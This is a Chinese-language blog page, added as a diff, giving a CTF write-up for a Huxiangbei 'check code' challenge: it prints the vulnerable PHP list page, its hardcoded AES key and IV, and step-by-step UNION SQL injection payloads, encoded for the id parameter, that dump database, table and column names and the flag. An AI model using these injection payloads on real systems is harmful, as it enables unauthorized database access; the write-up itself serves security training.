@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            湖湘杯的一个check code题
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-text">找字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%95%B0%E6%8D%AE"><span class="toc-text">读数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <p>题目地址：<a target="_blank" rel="noopener" href="http://47.107.232.77:49882/">http://47.107.232.77:49882/</a><br>打开后是一个公司的登录地址，试着用admin，admin登录一下。  </p>
+<p>返回错误：<br>Fatal error: Call to a member function fetch_assoc() on a non-object in /usr/share/nginx/html/login.php on line 15</p>
+<p>登录框下面还有一个网址：<a target="_blank" rel="noopener" href="http://47.107.232.77:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09">http://47.107.232.77:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09</a><br>试着用sqlmap跑了一下，没有注入。</p>
+<p>用御剑扫一下网址。<br>扫出来了一个：<a target="_blank" rel="noopener" href="http://47.107.232.77:49882/news/">http://47.107.232.77:49882/news/</a><br>打开之后发现一个文件目录，第二个是一个zip文件，下载。<br>里面是list网页的源码：  </p>
+<a id="more"></a>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="comment">//解密过程</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$td</span> = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">&#x27;&#x27;</span>,MCRYPT_MODE_CBC,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	mcrypt_generic_init(<span class="variable">$td</span>,<span class="string">&#x27;ydhaqPQnexoaDuW3&#x27;</span>,<span class="string">&#x27;2018201920202021&#x27;</span>);</span><br><span class="line">	<span class="variable">$data</span> = mdecrypt_generic(<span class="variable">$td</span>,base64_decode(base64_decode(<span class="variable">$data</span>)));</span><br><span class="line">	mcrypt_generic_deinit(<span class="variable">$td</span>);</span><br><span class="line">	mcrypt_module_close(<span class="variable">$td</span>);</span><br><span class="line">	<span class="keyword">if</span>(substr(trim(<span class="variable">$data</span>),<span class="number">-7</span>)!==<span class="string">&#x27;hxb2018&#x27;</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> substr(trim(<span class="variable">$data</span>),<span class="number">0</span>,strlen(trim(<span class="variable">$data</span>))<span class="number">-7</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=decode(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select id,title,content,time from notice where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="variable">$info</span>=<span class="variable">$link</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$arr</span>=<span class="variable">$info</span>-&gt;fetch_assoc();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从源码可知，这里存在一个注入的点，但是在赋值id变量的时候，还进行了一个一个解码过程，所以我们在注入的时候要先将我们的payload进行编码。  </p>
+<p>编码函数看起来很复杂，试着分析一下。</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p><strong>前面使用了PHP mcrypt加密扩展：</strong></p>
+<ol>
+<li><p>打开加密算法和模式<br> mcrypt_module_open(‘tripledes’, ‘’, ecb’’, ‘’);<br> 第一个参数是使用的加密算法的名称，对应mcrypt_list_algorithms()输出的加密算法；第三个参数对应加密的模式，对应mcrypt_list_modes()输出的支持加密模式。  </p>
+<p> 可知这个题目源码使用的是AES算法，并且加密算法为：MCRYPT_RIJNDAEL_128，加密模式为：MCRYPT_MODE_CBC。</p>
+</li>
+<li><p>创建初始化向量 (这题源码没有用到)<br> mcrypt_create_iv (mcrypt_enc_get_iv_size($td), MCRYPT_RAND);<br> PS.在Window平台下，第二个参数固定使用MCRYPT_RAND  </p>
+</li>
+<li><p>初始化加密缓冲区<br>mcrypt_generic_init($td, $key, $iv);<br>$td为返回的加密描述符，$key为加密密钥，$iv为初始化向量  </p>
+<p> 这题源码的解密密钥为：ydhaqPQnexoaDuW3 这里的iv它直接提供了：2018201920202021</p>
+</li>
+<li><p>数据加密  (题目当中用的是解密)<br> $encrypted_data = mcrypt_generic($td, $data);<br> $td为加密描述符，$data为加密前的数据，数据加密函数返回加密后的字符串。  </p>
+<p> 题目源码当中将data数据进行了两次base64编码，再进行AES解密。  </p>
+</li>
+<li><p>结束解密，执行清理工作<br> mcrypt_generic_deinit($td);</p>
+</li>
+</ol>
+<p>在进行加密后面还有一个判断语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr(trim(<span class="variable">$data</span>),<span class="number">-7</span>)!==<span class="string">&#x27;hxb2018&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> substr(trim(<span class="variable">$data</span>),<span class="number">0</span>,strlen(trim(<span class="variable">$data</span>))<span class="number">-7</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判断解密后的data数据当中最后是否有hxb2018字符，如果找到并将它删除返回处理后的data。</p>
+<p>那么到这里，构造加密的思路就为：（（（（构造的语句+hxb2018）AES加密）base64加密）base64加密）</p>
+<p>打开一个AES加解密的在线工具：<a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a>   (填充为zero)</p>
+<p>构造一个语句：1 and 1=2 union select 1,2,3,4hxb2018</p>
+<p>填入正确的内容，直接加密。（这里已经进行了一次base64加密）</p>
+<p>0hMY7i4yFMb48GTM7O6GEssuXfsRxn4Y0k5vZ9cRUUF6X4uM6Hu1P</p>
+<p>再进行一次base64加密</p>
+<p>MGhNWTdpNHlGTWI0OEdUTTdPNkdFc3N1WGZzUnhuNFkwazV2WjljUlVVRjZYNHVNNkh1MVAvaTR4bDRoTE9lQw==</p>
+<p>访问：<a target="_blank" rel="noopener" href="http://47.107.232.77:49882/news/list.php?id=MGhNWTdpNHlGTWI0OEdUTTdPNkdFc3N1WGZzUnhuNFkwazV2WjljUlVVRjZYNHVNNkh1MVAvaTR4bDRoTE9lQw==">http://47.107.232.77:49882/news/list.php?id=MGhNWTdpNHlGTWI0OEdUTTdPNkdFc3N1WGZzUnhuNFkwazV2WjljUlVVRjZYNHVNNkh1MVAvaTR4bDRoTE9lQw==</a></p>
+<p>出现标题为2，内容为3.则知道了显示位置。继续</p>
+<h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><p>1 and 1=2 union select 1,database(),version(),4hxb2018<br>得到数据库名为：mozhe_discuz_stormgroup</p>
+<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p>1 and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’mozhe_discuz_stormgroup’hxb2018<br>可得出表名为：notice,notice2,stormgroup_member</p>
+<h3 id="找字段名"><a href="#找字段名" class="headerlink" title="找字段名"></a>找字段名</h3><p>1 and 1=2 union select 1,group_concat(COLUMN_NAME),group_concat(COLUMN_TYPE),4 from information_schema.COLUMNS where TABLE_SCHEMA=’mozhe_discuz_stormgroup’ and TABLE_NAME=’stormgroup_member’hxb2018</p>
+<ul>
+<li><p>notice表：<br>id,title,content,time<br>int(4),varchar(200),varchar(2000),varchar(200)  </p>
+</li>
+<li><p>notice2表：<br>id,title<br>int(4),varchar(200)  </p>
+</li>
+<li><p>stormgroup_member表<br>id,name,password,status<br>int(11),varchar(20),varchar(255),int(11)  </p>
+</li>
+</ul>
+<h3 id="读数据"><a href="#读数据" class="headerlink" title="读数据"></a>读数据</h3><p>从stormgroup_member表中可以读出账号和密码，但是登录之后发现还是报错。</p>
+<p>于是我们再看一下其他的两个表，我们直接试一下notice2表，notice表一样的操作。</p>
+<p>1 and 1=2 union select 1,group_concat(id),group_concat(title),4 from mozhe_discuz_stormgroup.notice2hxb2018</p>
+<p>直接可以得出flag：hxb2018{1b4092cd183df0d2d1a96bcd3099d3d5}</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42357070/article/details/82878357">https://blog.csdn.net/qq_42357070/article/details/82878357</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/huyihao/p/6028753.html">https://www.cnblogs.com/huyihao/p/6028753.html</a></p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
